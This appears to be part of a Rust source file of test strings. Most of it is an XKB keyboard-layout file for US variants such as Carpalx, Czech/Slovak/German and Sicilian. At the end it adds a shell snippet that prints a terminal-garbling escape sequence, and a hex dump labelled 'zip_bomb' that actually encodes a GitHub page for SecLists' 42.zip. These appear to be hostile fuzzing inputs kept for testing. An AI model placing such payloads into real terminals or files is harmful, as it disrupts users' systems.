    key <AE01> {	[	  1,	exclam 		]	};
    key <AE02> {	[	  2,	at		]	};
    key <AE03> {	[	  3,	numbersign	]	};
    key <AE04> {	[	  4,	dollar		]	};
    key <AE05> {	[	  5,	percent		]	};
    key <AE06> {	[	  6,	asciicircum	]	};
    key <AE07> {	[	  7,	ampersand	]	};
    key <AE08> {	[	  8,	asterisk	]	};
    key <AE09> {	[	  9,	parenleft	]	};
    key <AE10> {	[	  0,	parenright	]	};
    key <AE11> {	[     minus,	underscore	]	};
    key <AE12> {	[     equal,	plus		]	};

    key <AD01> {	[	  x,	Q 		]	};
    key <AD02> {	[	  g,	G		]	};
    key <AD03> {	[	  m,	M		]	};
    key <AD04> {	[	  l,	L		]	};
    key <AD05> {	[	  w,	W		]	};
    key <AD06> {	[	  y,	Y		]	};
    key <AD07> {	[	  f,	F		]	};
    key <AD08> {	[	  u,	U		]	};
    key <AD09> {	[	  b,	B		]	};
    key <AD10> {	[ semicolon,	colon		]	};
    key <AD11> {	[ bracketleft,	braceleft	]	};
    key <AD12> {	[ bracketright,	braceright	]	};

    key <AC01> {	[	  d,	D 		]	};
    key <AC02> {	[	  s,	S		]	};
    key <AC03> {	[	  t,	T		]	};
    key <AC04> {	[	  n,	N		]	};
    key <AC05> {	[	  r,	R		]	};
    key <AC06> {	[	  i,	I		]	};
    key <AC07> {	[	  a,	A		]	};
    key <AC08> {	[	  e,	E		]	};
    key <AC09> {	[	  o,	O		]	};
    key <AC10> {	[	  h,	H		]	};
    key <AC11> {	[ apostrophe,	quotedbl	]	};

    key <AB01> {	[	  z,	Z 		]	};
    key <AB02> {	[	  x,	X		]	};
    key <AB03> {	[	  c,	C		]	};
    key <AB04> {	[	  v,	V		]	};
    key <AB05> {	[	  j,	J		]	};
    key <AB06> {	[	  k,	K		]	};
    key <AB07> {	[	  p,	P		]	};
    key <AB08> {	[     comma,	less		]	};
    key <AB09> {	[    period,	greater		]	};
    key <AB10> {	[     slash,	question	]	};

    key <BKSL> {	[ backslash,         bar	]	};
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-intl\" {

    include \"us(carpalx)\"
    name[Group1]= \"English (Carpalx, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };
    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [     minus, underscore,           yen,    dead_belowdot ] };
    key <AE12> { [     equal,       plus,      multiply,         division ] };

    key <AD01> { [	   x,          Q,        degree,        paragraph ] };
    key <AD02> { [	   g,          G,         U011F,            U011E ] };
    key <AD03> { [	   m,          M,            mu,               mu ] };
    key <AD04> { [	   l,          L,     copyright,             cent ] };
    key <AD05> { [	   w,          W,             w,                W ] };
    key <AD06> { [	   y,          Y,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   f,          F,    adiaeresis,       Adiaeresis ] };
    key <AD08> { [	   u,          U,    udiaeresis,       Udiaeresis ] };
    key <AD09> { [	   b,          B,    odiaeresis,       Odiaeresis ] };
    key <AD10> { [ semicolon,      colon,        oslash,         Ooblique ] };
    key <AD11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AD12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AC01> { [	   d,          D,           eth,              ETH ] };
    key <AC02> { [	   s,          S,        ssharp,          section ] };
    key <AC03> { [	   t,          T,         thorn,            THORN ] };
    key <AC04> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AC05> { [	   r,          R,    registered,       registered ] };
    key <AC06> { [	   i,          I,        iacute,           Iacute ] };
    key <AC07> { [	   a,          A,        aacute,           Aacute ] };
    key <AC08> { [	   e,          E,        eacute,           Eacute ] };
    key <AC09> { [	   o,          O,        oacute,           Oacute ] };
    key <AC10> { [	   h,          H,        uacute,           Uacute ] };
    key <AC11> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };

    key <AB01> { [	   z,          Z,             z,                Z ] };
    key <AB02> { [	   x,          X,         U015F,            U015E ] };
    key <AB03> { [	   c,          C,      ccedilla,         Ccedilla ] };
    key <AB04> { [	   v,          V,            ae,               AE ] };
    key <AB05> { [	   j,          J,            oe,               OE ] };
    key <AB06> { [	   k,          K,         U0131,            U0130 ] };
    key <AB07> { [	   p,          P,         aring,            Aring ] };
    key <AB08> { [     comma,       less,    ediaeresis,       Ediaeresis ] };
    key <AB09> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AB10> { [     slash,   question,  questiondown,        dead_hook ] };
    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

    include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and us(altgr-intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-altgr-intl\" {

   include \"us(carpalx-intl)\"
   name[Group1]= \"English (Carpalx, intl., with AltGr dead keys)\";

// five dead keys moved into level3:

   key <TLDE> { [    grave, asciitilde,  dead_grave,   dead_tilde      ] };
   key <AC11> { [apostrophe,quotedbl,    dead_acute,   dead_diaeresis  ] };

// diversions from the MS Intl keyboard:

   key <AE01> { [        1, exclam,      onesuperior,  exclamdown      ] };

// onequarter etc (not in iso8859-15) moved to get three unshifted deadkeys:

   key <AE06> { [        6, asciicircum, dead_circumflex, onequarter    ] };
   key <AE07> { [        7, ampersand,   dead_horn,       onehalf       ] };
   key <AE08> { [        8, asterisk,    dead_ogonek,     threequarters ] };

   include \"level3(ralt_switch)\"
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/

partial alphanumeric_keys
xkb_symbols \"carpalx-full\" {

    include \"us(carpalx)\"
    name[Group1]= \"English (Carpalx, full optimization)\";

    key <AD06> {	[	  b,	B		]	};
    key <AD07> {	[	  y,	Y		]	};
    key <AD09> {	[	  v,	V		]	};

    key <AB04> {	[	  f,	F		]	};
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-full-intl\" {

    include \"us(carpalx-intl)\"
    name[Group1]= \"English (Carpalx, full optimization, intl., with dead keys)\";

    key <AD06> { [	   b,          B,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   y,          Y,    adiaeresis,       Adiaeresis ] };
    key <AD09> { [	   v,          V,    odiaeresis,       Odiaeresis ] };

    key <AB04> { [	   f,          F,            ae,               AE ] };
};

// Carpalx layout created by Martin Krzywinski
// Full optimization variant without fixed QWERTY-like ZXCV keys
// http://mkweb.bcgsc.ca/carpalx/
// Merged with us(intl) and us(altgr-intl) and modified to move
// accented vowels closer to the plain vowels

partial alphanumeric_keys
xkb_symbols \"carpalx-full-altgr-intl\" {

   include \"us(carpalx-altgr-intl)\"
   name[Group1]= \"English (Carpalx, full optimization, intl., with AltGr dead keys)\";

    key <AD06> { [	   b,          B,    idiaeresis,       Idiaeresis ] };
    key <AD07> { [	   y,          Y,    adiaeresis,       Adiaeresis ] };
    key <AD09> { [	   v,          V,    odiaeresis,       Odiaeresis ] };

    key <AB04> { [	   f,          F,            ae,               AE ] };
};

// EXTRAS:

// Czech, Slovak and German charecters added as third level symbols to US keyboard layout.
partial alphanumeric_keys
xkb_symbols \"cz_sk_de\" {

    include \"us\"
    name[Group1]=\"Czech Slovak and German (US)\";

    key <TLDE>  { [grave,   asciitilde, uring,      Uring       ] };
    key <AE01>	{ [    1,	exclam,	uacute,	    Uacute	] };
    key <AE02>	{ [    2,           at, ecaron,	    Ecaron	] };
    key <AE03>	{ [    3,   numbersign, scaron,	    Scaron	] };
    key <AE04>	{ [    4,       dollar,	ccaron,	    Ccaron	] };
    key <AE05>	{ [    5,      percent, rcaron,	    Rcaron	] };
    key <AE06>	{ [    6,  asciicircum, zcaron,	    Zcaron	] };
    key <AE07>	{ [    7,    ampersand,	yacute,	    Yacute	] };
    key <AE08>	{ [    8,     asterisk, aacute,	    Aacute	] };
    key <AE09>	{ [    9,    parenleft,	iacute,	    Iacute	] };
    key <AE10>	{ [    0,   parenright, eacute,	    Eacute	] };
    key <AE11>	{ [minus,   underscore, ssharp,     0x1001E9E	] };
    key <AE12>	{ [equal,	  plus, dead_acute, dead_caron  ] };

    key <AD03>	{ [         e,          E,     EuroSign,     Eacute ]	};

    key <AD11>	{ [bracketleft, braceleft,   udiaeresis,   Udiaeresis ]	};
    key <AC10>	{ [ semicolon,      colon,   odiaeresis,   Odiaeresis ]	};
    key <AC11>	{ [apostrophe,      quotedbl,adiaeresis,   Adiaeresis ]	};

    key <AC01>	{ [         a,          A,     aacute,	     Aacute   ]	};
    key <AD08>	{ [         i,          I,     iacute,	     Iacute   ]	};
    key <AD09>	{ [         o,          O,     oacute,       Oacute   ]	};
    key <AD06>	{ [         y,          Y,     yacute,       Yacute   ]	};
    key <AD07>	{ [         u,          U,     uring,	     Uring    ]	};

    key <AC02>	{ [         s,          S,     scaron,       Scaron   ]	};
    key <AB01>	{ [         z,          Z,     zcaron,	     Zcaron   ]	};
    key <AB03>	{ [         c,          C,     ccaron,       Ccaron   ]	};
    key <AD04>	{ [         r,          R,     rcaron,	     Rcaron   ]	};
    key <AD05>	{ [         t,          T,     tcaron,	     Tcaron   ]	};
    key <AC03>	{ [         d,          D,     dcaron,	     Dcaron   ]	};
    key <AB06>	{ [         n,          N,     ncaron,	     Ncaron   ]	};
    key <AC09>  { [         l,          L,     lcaron,       Lcaron   ] };
    key <AD10>  { [         p,          P,ocircumflex,  Ocircumflex   ] };

    key <SPCE>  { [     space,       space, nobreakspace, nobreakspace] };

    include \"level3(ralt_switch)\"
};

// 03 December 2017 - Added us(scn), please refer to
//                    Cadèmia Siciliana <l10n@cademiasiciliana.org>
partial alphanumeric_keys
xkb_symbols \"scn\" {

    include \"us(intl)\"
    name[Group1]=\"Sicilian (US keyboard)\";

    key <AD03> { [      e,       E, U0259,       U018F ] };
    key <AC03> { [      d,       D, U1E0D,       U1E0C ] };
    key <AC04> { [      f,       F, U0111,       U0110 ] };
    key <AC06> { [      h,       H, U1E25,       U1E24 ] };
    key <AB02> { [      x,       X, U03C7,       U03A7 ] };
    key <AB09> { [ period, greater, U1D58,  dead_caron ] };

    include \"level3(ralt_switch)\"
};

// XCompose is out! Unicode combining is in!  For those of us who live
// on the edge: A keymap using Unicode combining characters instead of
// deadkeys.  This variation does not deviate from the lame MS-style
// US-intl layout; but it uses AltGr for combining, like altgr-intl.
//
// This might break your font layout layout systems (because they
// suck), caveat emptor.  Also, most of today's software will count
// individual combining marks for selection, deletion, character
// counting &c., and won't be smart enough to do canonical equivalence
// when searching, &c.
//
// With Unicode combining you use \"handwriting order\", not
// \"typewriting order\" as with deadkeys.  That is, you first type the
// base character, then the diacritics/accents/modifiers.  This has
// the advantage of avoiding hidden states --- each keypress changes
// something on screen.
//
// TODO: as of now, this duplicates all us(intl) functionality with
// combining.  With care, perhaps we could add more combining marks
// not present in intl, and support all major languages.
partial alphanumeric_keys
xkb_symbols \"intl-unicode\" {

 name[Group1]= \"English (US, international AltGr Unicode combining)\";

 include \"us(intl)\"
 include \"level3(ralt_switch)\"

 // grave, tilde
 key <TLDE> { [grave, asciitilde, U0300, U0303 ] };
 // double acute
 key <AE02> { [ 2, at, twosuperior, U030B ] };
 // macron
 key <AE03> { [ 3, numbersign, threesuperior, U0304 ] };
 // circumflex
 key <AE06> { [ 6, asciicircum, onequarter, U0302 ] };
 // horn
 key <AE07> { [ 7, ampersand, onehalf, U031B ] };
 // ogonek
 key <AE08> { [ 8, asterisk, threequarters, U0328 ] };
 // breve
 key <AE09> { [	 9, parenleft, leftsinglequotemark, U0306 ] };
 // abovering
 key <AE10> { [	 0, parenright, rightsinglequotemark, U030A ] };

 // belowdot
 key <AE11> { [ minus, underscore, yen, U0323 ] };
 // acute, diaeresis
 key <AC11> { [apostrophe, quotedbl, U0301, U0308 ] };
 // abovedot, caron
 key <AB09> { [ period, greater, U0307, U030C ] };
 // hook
 key <AB10> { [ slash, question, questiondown, U0309 ] };

 // alt-intl compatibility
 // cedilla, caron
 key <AB08> { [ comma, less,	 U0327, U030C ] };
 // ogonek, diaeresis
 key <AC10> { [ semicolon, colon,	 U0328, U0308 ] };
 // doubleacute, horn
 key <AE12> { [ equal, plus,	 U030B, U031B ] };

 // we don't do combining latin letters and combining enclosures
 // because support for those is very rare.
};

// XCompose is out! Unicode combining is in! For those of us who live
// on the edge: A keymap using Unicode combining characters instead of
// deadkeys. This variation does break compatibility with us-intl,
// whenever I thought it would be more mnemonic or Unicodeish.
partial alphanumeric_keys
xkb_symbols \"alt-intl-unicode\" {

 name[Group1]= \"English (US, international AltGr Unicode combining, alternative)\";

 include \"us(intl-unicode)\"

 // easier macron; em-dash.
 // em-dash is available via compose, but I added here since it's such
 // an important typographic character.
 key <AE11> { [ minus, underscore, U0304, U2014 ] };

 // belowdot, abovedot (caron at coma/less key, per above)
 key <AB09> { [ period, greater, U0323, U0307 ] };

};

partial alphanumeric_keys
xkb_symbols \"ats\" {

    include \"us\"
    name[Group1]= \"Atsina\";

    //Using Dead key to get COMBINING COMMA ABOVE for ejectives on
    //q, l, t, s, m, g, k, p, w, y, r
    //XCompose key is used for the other accute and grave.

    key <AD03> { [ e, E, eacute, Eacute  ] };
    key <AD07> { [ u, U, uacute, Uacute  ] };
    key <AD08> { [ i, I, iacute, Iacute  ] };
    key <AD09> { [ o, O, oacute, Oacute  ] };
    key <AD11> { [ bracketleft,	braceleft, U03B8 ] };
    key <AD12> { [ bracketright, braceright, U010D, U010C ] };
    //U+010C (uppercase Č) and U+010D (lowercase č).

    key <AC01> { [ a, A, aacute, Aacute  ] };

    //Small letter Open use compose to key get acute accent
    key <AB03> { [ c,	C, U0254, U0186		  ] };
    key <AB08> { [ comma,     less, U0313 ] };
    key <AB10> { [ slash, question, U0294 ] };

    include \"level3(ralt_switch)\"
    include \"compose(rctrl)\"
};

partial alphanumeric_keys
xkb_symbols \"crd\" {

  include \"us\"
  name[Group1]= \"Coeur d'Alene Salish\";

  key <AD02> { [         w,           W, U02B7, U02B7 ] };
  key <AE07> { [         7,   ampersand, U0294        ] };
  key <AD01> { [         x,           Q, U221A        ] };
  key <AB04> { [         v,           V, U0259        ] };
  key <BKSL> { [ backslash,         bar, U026B        ] };
  key <AD03> { [         e,           E, U025B        ] };
  key <AD08> { [         i,           I, U026A        ] };
  key <AC07> { [         j,           J, U01F0        ] };
  key <AE06> { [         6, asciicircum, U0295        ] };
  key <AC02> { [         s,           S, U0161        ] };
  key <AB03> { [         c,           C, U010D        ] };
  key <AD09> { [         o,           O, U0254        ] };
  key <AB09> { [    period,     greater, U0323        ] };

  include \"level3(ralt_switch)\"
  include \"compose(rctrl)\"
};


partial alphanumeric_keys
	xkb_symbols \"sun_type6\" {
	include \"sun_vndr/us(sun_type6)\"
};");
    let meta_term = String::from("if [ -f ~/.bashrc ]; then
        echo -e \"\\033(0\"
fi\n");
    let zip_bomb = String::from("
0000000 0a0a 0a0a 0a0a 213c 4f44 5443 5059 2045
0000010 7468 6c6d 0a3e 683c 6d74 206c 616c 676e
0000020 223d 6e65 3e22 200a 3c20 6568 6461 0a3e
0000030 2020 2020 6d3c 7465 2061 6863 7261 6573
0000040 3d74 7522 6674 382d 3e22 200a 3c20 696c
0000050 6b6e 7220 6c65 223d 6e64 2d73 7270 6665
0000060 7465 6863 2022 7268 6665 223d 7468 7074
0000070 3a73 2f2f 6967 6874 6275 672e 7469 7568
0000080 6162 7373 7465 2e73 6f63 226d 0a3e 2020
0000090 6c3c 6e69 206b 6572 3d6c 6422 736e 702d
00000a0 6572 6566 6374 2268 6820 6572 3d66 6822
00000b0 7474 7370 2f3a 612f 6176 6174 7372 2e30
00000c0 6967 6874 6275 7375 7265 6f63 746e 6e65
00000d0 2e74 6f63 226d 0a3e 2020 6c3c 6e69 206b
00000e0 6572 3d6c 6422 736e 702d 6572 6566 6374
00000f0 2268 6820 6572 3d66 6822 7474 7370 2f3a
0000100 612f 6176 6174 7372 2e31 6967 6874 6275
0000110 7375 7265 6f63 746e 6e65 2e74 6f63 226d
0000120 0a3e 2020 6c3c 6e69 206b 6572 3d6c 6422
0000130 736e 702d 6572 6566 6374 2268 6820 6572
0000140 3d66 6822 7474 7370 2f3a 612f 6176 6174
0000150 7372 2e32 6967 6874 6275 7375 7265 6f63
0000160 746e 6e65 2e74 6f63 226d 0a3e 2020 6c3c
0000170 6e69 206b 6572 3d6c 6422 736e 702d 6572
0000180 6566 6374 2268 6820 6572 3d66 6822 7474
0000190 7370 2f3a 612f 6176 6174 7372 2e33 6967
00001a0 6874 6275 7375 7265 6f63 746e 6e65 2e74
00001b0 6f63 226d 0a3e 2020 6c3c 6e69 206b 6572
00001c0 3d6c 6422 736e 702d 6572 6566 6374 2268
00001d0 6820 6572 3d66 6822 7474 7370 2f3a 672f
00001e0 7469 7568 2d62 6c63 756f 2e64 3373 612e
00001f0 616d 6f7a 616e 7377 632e 6d6f 3e22 200a
0000200 3c20 696c 6b6e 7220 6c65 223d 6e64 2d73
0000210 7270 6665 7465 6863 2022 7268 6665 223d
0000220 7468 7074 3a73 2f2f 7375 7265 692d 616d
0000230 6567 2e73 6967 6874 6275 7375 7265 6f63
0000240 746e 6e65 2e74 6f63 2f6d 3e22 0a0a 0a0a
0000250 2020 6c3c 6e69 206b 7263 736f 6f73 6972
0000260 6967 3d6e 6122 6f6e 796e 6f6d 7375 2022
0000270 656d 6964 3d61 6122 6c6c 2022 6e69 6574
0000280 7267 7469 3d79 7322 6168 3135 2d32 2b33
0000290 4f48 4371 7477 6151 356c 4f68 514a 6d2b
00002a0 7864 7169 7a35 476d 544f 466a 5236 6a68
00002b0 7344 4c50 6278 444b 6759 6c47 464c 4365
00002c0 7a77 496f 6e61 3762 356a 6949 7543 4b58
00002d0 7155 4379 7132 4638 6b64 3443 6d6e 3278
00002e0 3250 4172 3d3d 2022 6572 3d6c 7322 7974
00002f0 656c 6873 6565 2274 6820 6572 3d66 6822
0000300 7474 7370 2f3a 672f 7469 7568 2e62 6967
0000310 6874 6275 7361 6573 7374 632e 6d6f 612f
0000320 7373 7465 2f73 7266 6d61 7765 726f 736b
0000330 612d 6632 6162 3232 6433 6135 3966 3431
0000340 3639 6163 3763 6430 6534 3363 3236 6434
0000350 2e66 7363 2273 2f20 0a3e 2020 6c3c 6e69
0000360 206b 7263 736f 6f73 6972 6967 3d6e 6122
0000370 6f6e 796e 6f6d 7375 2022 656d 6964 3d61
0000380 6122 6c6c 2022 6e69 6574 7267 7469 3d79
0000390 7322 6168 3135 2d32 746a 7079 7067 5353
00003a0 4579 4d76 742f 6b4b 4b6b 744b 554b 5a59
00003b0 5862 6f79 6270 752f 7a47 2f57 6f37 4150
00003c0 716b 4468 5976 6c56 4630 7945 5455 3057
00003d0 6f42 3549 2f79 4446 4d6c 6e30 6e74 346b
00003e0 797a 6574 3164 7158 5834 3078 776c 3d3d
00003f0 2022 6572 3d6c 7322 7974 656c 6873 6565
0000400 2274 6820 6572 3d66 6822 7474 7370 2f3a
0000410 672f 7469 7568 2e62 6967 6874 6275 7361
0000420 6573 7374 632e 6d6f 612f 7373 7465 2f73
0000430 6973 6574 632d 3764 6631 3833 3866 3636
0000440 3337 3261 3635 3761 3835 6338 3263 6133
0000450 3834 3666 2e62 7363 2273 2f20 0a3e 2020
0000460 2020 6c3c 6e69 206b 7263 736f 6f73 6972
0000470 6967 3d6e 6122 6f6e 796e 6f6d 7375 2022
0000480 656d 6964 3d61 6122 6c6c 2022 6e69 6574
0000490 7267 7469 3d79 7322 6168 3135 2d32 754b
00004a0 6a53 4767 2f42 5266 4558 4863 4935 764c
00004b0 5479 396c 3958 784c 6d4a 6339 4964 5935
00004c0 5754 7a74 5769 6b62 3273 7866 4851 7562
00004d0 7476 6a2f 2f74 792b 4444 6d63 4a35 2b75
00004e0 6a70 7778 6a34 7667 3968 784f 3032 7838
00004f0 2b46 5165 3d3d 2022 6572 3d6c 7322 7974
0000500 656c 6873 6565 2274 6820 6572 3d66 6822
0000510 7474 7370 2f3a 672f 7469 7568 2e62 6967
0000520 6874 6275 7361 6573 7374 632e 6d6f 612f
0000530 7373 7465 2f73 6967 6874 6275 662d 6463
0000540 3937 3362 6138 3566 3535 6238 3462 6237
0000550 6630 6665 3266 6335 6164 6135 2e65 7363
0000560 2273 2f20 0a3e 2020 2020 200a 2020 0a20
0000570 2020 2020 200a 2020 0a20 200a 3c20 656d
0000580 6174 6e20 6d61 3d65 7622 6569 7077 726f
0000590 2274 6320 6e6f 6574 746e 223d 6977 7464
00005a0 3d68 6564 6976 6563 772d 6469 6874 3e22
00005b0 200a 0a20 2020 743c 7469 656c 533e 6365
00005c0 694c 7473 2f73 3234 7a2e 7069 6120 2074
00005d0 616d 7473 7265 c220 20b7 6164 696e 6c65
00005e0 696d 7365 6c73 7265 532f 6365 694c 7473
00005f0 2073 b7c2 4720 7469 7548 3c62 742f 7469
0000600 656c 0a3e 2020 2020 6d3c 7465 2061 616e
0000610 656d 223d 6564 6373 6972 7470 6f69 226e
0000620 6320 6e6f 6574 746e 223d 6553 4c63 7369
0000630 7374 6920 2073 6874 2065 6573 7563 6972
0000640 7974 7420 7365 6574 2672 3323 3b39 2073
0000650 6f63 706d 6e61 6f69 2e6e 4920 2674 3323
0000660 3b39 2073 2061 6f63 6c6c 6365 6974 6e6f
0000670 6f20 2066 756d 746c 7069 656c 7420 7079
0000680 7365 6f20 2066 696c 7473 2073 7375 6465
0000690 6420 7275 6e69 2067 6573 7563 6972 7974
00006a0 6120 7373 7365 6d73 6e65 7374 202c 6f63
00006b0 6c6c 6365 6574 2064 6e69 6f20 656e 7020
00006c0 616c 6563 202e 694c 7473 7420 7079 7365
00006d0 6920 636e 756c 6564 7520 6573 6e72 6d61
00006e0 7365 202c 6170 7373 6f77 6472 2c73 5520
00006f0 4c52 2c73 7320 6e65 6973 6974 6576 6420
0000700 7461 2061 6170 7474 7265 736e 202c 7566
0000710 7a7a 6e69 2067 6170 6c79 616f 7364 202c
0000720 6577 2062 6873 6c65 736c 202c 6e61 2064
0000730 616d 796e 6d20 726f 2e65 2d20 6420 6e61
0000740 6569 6d6c 6569 7373 656c 2f72 6553 4c63
0000750 7369 7374 3e22 200a 2020 3c20 696c 6b6e
0000760 7220 6c65 223d 6573 7261 6863 2022 7974
0000770 6570 223d 7061 6c70 6369 7461 6f69 2f6e
0000780 706f 6e65 6573 7261 6863 6564 6373 6972
0000790 7470 6f69 2b6e 6d78 226c 6820 6572 3d66
00007a0 2f22 706f 6e65 6573 7261 6863 782e 6c6d
00007b0 2022 6974 6c74 3d65 4722 7469 7548 2262
00007c0 0a3e 2020 6c3c 6e69 206b 6572 3d6c 6622
00007d0 756c 6469 692d 6f63 226e 6820 6572 3d66
00007e0 6822 7474 7370 2f3a 672f 7469 7568 2e62
00007f0 6f63 2f6d 6c66 6975 6964 6f63 2e6e 6e70
0000800 2267 7420 7469 656c 223d 6947 4874 6275
0000810 3e22 200a 3c20 656d 6174 7020 6f72 6570
0000820 7472 3d79 6622 3a62 7061 5f70 6469 2022
0000830 6f63 746e 6e65 3d74 3122 3034 3431 3838
0000840 3936 3433 3633 3235 2238 0a3e 200a 2020
0000850 3c20 656d 6174 6e20 6d61 3d65 7422 6977
0000860 7474 7265 693a 616d 6567 733a 6372 2022
0000870 6f63 746e 6e65 3d74 6822 7474 7370 2f3a
0000880 612f 6176 6174 7372 2e33 6967 6874 6275
0000890 7375 7265 6f63 746e 6e65 2e74 6f63 2f6d
00008a0 2f75 3035 3536 3f34 3d73 3034 2630 6d61
00008b0 3b70 3d76 2234 2f20 3c3e 656d 6174 6e20
00008c0 6d61 3d65 7422 6977 7474 7265 733a 7469
00008d0 2265 6320 6e6f 6574 746e 223d 6740 7469
00008e0 7568 2262 2f20 3c3e 656d 6174 6e20 6d61
00008f0 3d65 7422 6977 7474 7265 633a 7261 2264
0000900 6320 6e6f 6574 746e 223d 7573 6d6d 7261
0000910 2279 2f20 3c3e 656d 6174 6e20 6d61 3d65
0000920 7422 6977 7474 7265 743a 7469 656c 2022
0000930 6f63 746e 6e65 3d74 6422 6e61 6569 6d6c
0000940 6569 7373 656c 2f72 6553 4c63 7369 7374
0000950 2022 3e2f 6d3c 7465 2061 616e 656d 223d
0000960 7774 7469 6574 3a72 6564 6373 6972 7470
0000970 6f69 226e 6320 6e6f 6574 746e 223d 6553
0000980 4c63 7369 7374 6920 2073 6874 2065 6573
0000990 7563 6972 7974 7420 7365 6574 2672 6d61
00009a0 3b70 6d61 3b70 3323 3b39 2073 6f63 706d
00009b0 6e61 6f69 2e6e 4920 2674 6d61 3b70 6d61
00009c0 3b70 3323 3b39 2073 2061 6f63 6c6c 6365
00009d0 6974 6e6f 6f20 2066 756d 746c 7069 656c
00009e0 7420 7079 7365 6f20 2066 696c 7473 2073
00009f0 7375 6465 6420 7275 6e69 2067 6573 7563
0000a00 6972 7974 6120 7373 7365 6d73 6e65 7374
0000a10 202c 6f63 6c6c 6365 6574 2064 6e69 6f20
0000a20 656e 7020 616c 6563 202e 694c 7473 7420
0000a30 7079 7365 6920 636e 756c 6564 7520 6573
0000a40 6e72 6d61 7365 202c 6170 2e73 2e2e 2022
0000a50 3e2f 200a 2020 3c20 656d 6174 7020 6f72
0000a60 6570 7472 3d79 6f22 3a67 6d69 6761 2265
0000a70 6320 6e6f 6574 746e 223d 7468 7074 3a73
0000a80 2f2f 7661 7461 7261 3373 672e 7469 7568
0000a90 7562 6573 6372 6e6f 6574 746e 632e 6d6f
0000aa0 752f 352f 3630 3435 733f 343d 3030 6126
0000ab0 706d 763b 343d 2022 3e2f 6d3c 7465 2061
0000ac0 7270 706f 7265 7974 223d 676f 733a 7469
0000ad0 5f65 616e 656d 2022 6f63 746e 6e65 3d74
0000ae0 4722 7469 7548 2262 2f20 3c3e 656d 6174
0000af0 7020 6f72 6570 7472 3d79 6f22 3a67 7974
0000b00 6570 2022 6f63 746e 6e65 3d74 6f22 6a62
0000b10 6365 2274 2f20 3c3e 656d 6174 7020 6f72
0000b20 6570 7472 3d79 6f22 3a67 6974 6c74 2265
0000b30 6320 6e6f 6574 746e 223d 6164 696e 6c65
0000b40 696d 7365 6c73 7265 532f 6365 694c 7473
0000b50 2273 2f20 3c3e 656d 6174 7020 6f72 6570
0000b60 7472 3d79 6f22 3a67 7275 226c 6320 6e6f
0000b70 6574 746e 223d 7468 7074 3a73 2f2f 6967
0000b80 6874 6275 632e 6d6f 642f 6e61 6569 6d6c
0000b90 6569 7373 656c 2f72 6553 4c63 7369 7374
0000ba0 2022 3e2f 6d3c 7465 2061 7270 706f 7265
0000bb0 7974 223d 676f 643a 7365 7263 7069 6974
0000bc0 6e6f 2022 6f63 746e 6e65 3d74 5322 6365
0000bd0 694c 7473 2073 7369 7420 6568 7320 6365
0000be0 7275 7469 2079 6574 7473 7265 6126 706d
0000bf0 233b 3933 733b 6320 6d6f 6170 696e 6e6f
0000c00 202e 7449 6126 706d 233b 3933 733b 6120
0000c10 6320 6c6f 656c 7463 6f69 206e 666f 6d20
0000c20 6c75 6974 6c70 2065 7974 6570 2073 666f
0000c30 6c20 7369 7374 7520 6573 2064 7564 6972
0000c40 676e 7320 6365 7275 7469 2079 7361 6573
0000c50 7373 656d 746e 2c73 6320 6c6f 656c 7463
0000c60 6465 6920 206e 6e6f 2065 6c70 6361 2e65
0000c70 4c20 7369 2074 7974 6570 2073 6e69 6c63
0000c80 6475 2065 7375 7265 616e 656d 2c73 7020
0000c90 7361 7773 726f 7364 202c 2e2e 222e 2f20
0000ca0 0a3e 200a 3c20 696c 6b6e 7220 6c65 223d
0000cb0 7361 6573 7374 2022 7268 6665 223d 7468
0000cc0 7074 3a73 2f2f 6967 6874 6275 672e 7469
0000cd0 7568 6162 7373 7465 2e73 6f63 2f6d 3e22
0000ce0 200a 0a20 2020 6d3c 7465 2061 616e 656d
0000cf0 223d 6a70 7861 742d 6d69 6f65 7475 2022
0000d00 6f63 746e 6e65 3d74 3122 3030 2230 0a3e
0000d10 2020 200a 3c20 656d 6174 6e20 6d61 3d65
0000d20 7222 7165 6575 7473 692d 2264 6320 6e6f
0000d30 6574 746e 223d 4143 3737 373a 4538 3a34
0000d40 3034 3035 3131 363a 3143 4636 3a32 4335
0000d50 4343 4245 4637 2022 6164 6174 702d 616a
0000d60 2d78 7274 6e61 6973 6e65 3e74 0a0a 200a
0000d70 0a20 200a 3c20 656d 6174 6e20 6d61 3d65
0000d80 7322 6c65 6365 6574 2d64 696c 6b6e 2022
0000d90 6176 756c 3d65 7222 7065 5f6f 6f73 7275
0000da0 6563 2022 6164 6174 702d 616a 2d78 7274
